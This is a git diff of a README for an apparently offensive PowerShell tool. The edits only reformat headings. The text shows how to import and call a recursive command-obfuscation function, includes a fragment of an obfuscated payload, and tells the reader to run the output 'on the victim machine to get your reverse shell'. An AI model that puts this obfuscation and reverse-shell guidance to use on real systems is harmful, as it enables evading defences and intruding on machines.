@@ -23,22 +23,22 @@ Consider online pfx file as compromised, use you own certificates !
 
 ## Using the Standalone Shellingan.ps1
 
-Simple Recursive Powershell Command Obfuscation - for training purpose
+This script is a simple recursive PowerShell command obfuscation function
 
-## Import
+### Import
 
 ```powershell
 . .\shellingan.ps1
 ```
 
-## Hello World 
+### Hello World 
 
 ```powershell
 Invoke-Shellingan -cmd 'write helloworld' -iex $true -recurse 1
 ```
 Then you just have to copy-paste the output where you want execute it.
 
-## Proof Of Concept
+### Proof Of Concept
 
 ![exemple2](https://github.com/Aif4thah/uCShiwa/blob/main/POC-Shellingan.png)
 
@@ -72,7 +72,7 @@ $186=255;$208=[SYStEM.TexT.ENCoDiNg];$102=$208::Utf8.gETByTeS('');$208::AsCii.Ge
 ```
 Copy and Execute the output on the victim machine to get your reverse shell !
 
-##Options
+### Shellingan Options
 
 ```console
 -cmd: Mandatory
